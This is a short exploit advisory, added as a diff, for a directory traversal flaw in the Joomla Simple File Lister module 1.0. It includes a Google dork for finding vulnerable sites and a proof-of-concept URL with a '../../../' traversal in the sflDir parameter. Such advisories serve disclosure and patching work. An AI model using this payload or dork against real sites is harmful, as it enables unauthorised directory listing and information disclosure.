@@ -1,0 +1,29 @@
+# Exploit Title: Joomla Simple File Lister module <= 1.0 Directory Traversal Vulnerability
+# Google Dork: "Simple File Lister v1.0" "Files in directory"
+# Date: 2011-08-28
+# Author: evilsocket ( evilsocket [at] gmail [dot] com )
+# Software Link: http://extensions.joomla.org/extensions/core-enhancements/file-management/15793
+# Version: 1.0
+
+---------------
+Vulnerable code
+---------------
+
+[ helper.php line 51 ]
+
+function getDirContents($params, $sfl_dirlocation, $sfl_basepath, $sfl_maxfiles, $sfl_userlocation) {
+  ...
+  ...
+  really messy code, generally speaking the variable $sfl_dirlocation which contains the directory to be
+  read is not succesfully sanitized for relative paths
+  ...
+  ...
+
+
+---
+PoC
+---
+
+http://www.site.com/index.php?option=com_content&view=article&id=[A VALID ID]&Itemid=[A VALID ID]&sflaction=dir&sflDir=../../../
+
+To look for a valid url, just sniff the HTTP request sent from the module javascript code once a directory is clicked.
